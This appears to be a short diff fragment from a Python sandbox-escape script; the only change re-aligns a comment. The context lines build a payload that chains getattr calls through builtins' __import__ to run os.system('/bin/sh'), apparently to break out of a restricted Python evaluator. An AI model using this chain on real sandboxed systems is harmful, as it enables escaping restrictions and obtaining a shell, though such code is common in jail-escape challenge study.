@@ -225,7 +225,7 @@ sys_name = string_expr("system")
 sh_str   = string_expr("/bin/sh")    
 
 # 1c) Chain getattr calls / indexing:
-step1 = getattr_call("c", "__self__")            # getattr(c, "__self__")
+step1 = getattr_call("c", "__self__")               # getattr(c, "__self__")
 step2 = f"c({step1},{imp_name})({os_mod})"          # getattr(B, "__import__")("os")
 step3 = f"c({step2},{sys_name})({sh_str})"          # getattr(os, "system")("/bin/sh")
 
